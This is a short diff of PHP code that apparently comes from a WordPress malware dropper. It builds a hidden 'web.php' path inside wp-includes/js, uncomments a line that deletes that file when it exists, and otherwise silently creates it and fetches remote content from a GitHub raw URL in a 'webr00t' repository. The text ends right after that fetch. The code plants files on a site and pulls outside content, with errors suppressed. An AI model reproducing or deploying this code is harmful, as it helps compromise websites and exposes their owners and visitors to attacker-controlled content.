@@ -1,6 +1,6 @@
 $yol = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/js/web.php";
 if ( file_exists( $yol ) ) {
-//unlink($yol);
+unlink($yol);
 }else {
 @touch($yol);
 @$h = @file_get_contents("https://raw.githubusercontent.com/webr00t/web/master/lnks.txt");
